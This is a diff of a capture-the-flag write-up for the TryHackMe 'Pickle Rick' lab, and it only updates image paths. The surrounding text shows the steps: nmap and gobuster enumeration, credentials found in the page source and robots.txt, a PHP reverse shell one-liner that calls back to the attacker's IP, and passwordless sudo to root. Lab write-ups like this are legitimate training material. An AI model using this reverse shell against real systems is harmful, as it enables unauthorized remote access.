@@ -19,7 +19,7 @@ tags: [ctf, thm, tryhackme, easy]
 
 **Room difficulty : Easy**
 
-![image](images/image2.jpg)
+![image](/assets/images/THM-Pickle_rick/image2.jpg)
 
 Deploy the virtual machine on this task and explore the web application : 10.10.181.250
 
@@ -52,7 +52,7 @@ By default, Nmap scans the 1000 most common ports. I run another Nmap scan in pa
 nmap -p- 10.10.181.255 -T4
 ```
 
-![nmap](images/scanmap.png)
+![nmap](/assets/images/THM-Pickle_rick/scanmap.png)
 
 
 Ports 22 (SSH) and 80 (HTTP) are open. Before taking a look at the webpage, we run a GoBuster scan to enumerate the Web Application's directories :
@@ -63,16 +63,16 @@ gobuster dir -w /home/kali/Downloads/SecLists/Discovery/Web-Content/common.txt -
 While it's running, we can take a look at the web page 
 
 
-![WebPage](images/PageWeb.png)
+![WebPage](/assets/images/THM-Pickle_rick/PageWeb.png)
 
 
 By looking at the page's source code, we can see that the username is mentioned.
 
-![CodeSource](images/codesource.png)
+![CodeSource](/assets/images/THM-Pickle_rick/codesource.png)
 
 Meanwhile, the Gobuster scan finished, and we obtained the following results :
 
-![Goresults](images/goresults.png)
+![Goresults](/assets/images/THM-Pickle_rick/goresults.png)
 
 The `/assets` directory holds GIF, CSS, and JS files for the site, with nothing noteworthy.
 So we'll focus on the two other results :
@@ -80,13 +80,13 @@ So we'll focus on the two other results :
 
 This page contains a login panel : 
 
-![login](images/login.png)
+![login](/assets/images/THM-Pickle_rick/login.png)
 
 - **robots.txt**
 
 This file may contain useful informations. In this case, however, it’s a non-standard file containing just a curious word : **'Wubbalubbadubdub'** 
 
-![robot](images/robot.png)
+![robot](/assets/images/THM-Pickle_rick/robot.png)
 
 
 Possible password for the previously found username, let's try logging in :
@@ -100,7 +100,7 @@ Possible password for the previously found username, let's try logging in :
 
 After logging in, we explore the application. Top menu links are mostly denied, but the Commands page looks interesting. The ls command returns :
 
-![commandpanel](images/commandpanel.png)
+![commandpanel](/assets/images/THM-Pickle_rick/commandpanel.png)
 
 ---
 
@@ -118,15 +118,15 @@ And execute a PHP Reverse Shell on the command panel :
 php -r '$sock=fsockopen("MyIPAdress",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-![shell](images/propershell.png)
+![shell](/assets/images/THM-Pickle_rick/propershell.png)
 
 We found our first ingredient in the `Sup3rS3cretPickl3Ingred.txt` file
 
-![flag1](images/flag1.png)
+![flag1](/assets/images/THM-Pickle_rick/flag1.png)
 
 Opening the `clue.txt` file gives us a hint for what comes next.
 
-![clue](images/clue.png)
+![clue](/assets/images/THM-Pickle_rick/clue.png)
 
 --- 
 
@@ -134,7 +134,7 @@ Opening the `clue.txt` file gives us a hint for what comes next.
 
 Before continuing, we run `sudo -l` to check which sudo privileges we have.
 
-![sudo](images/sudo.png)
+![sudo](/assets/images/THM-Pickle_rick/sudo.png)
 
 It shows that the 'www-data' account can run commands as root without needing a password.
 
@@ -143,9 +143,9 @@ It shows that the 'www-data' account can run commands as root without needing a 
 
 By exploring the machine, we’re able to obtain the other ingredients.
 
-![flag2](images/flag2.png)
+![flag2](/assets/images/THM-Pickle_rick/flag2.png)
 
-![flag3](images/flag3.png)
+![flag3](/assets/images/THM-Pickle_rick/flag3.png)
 
 
 
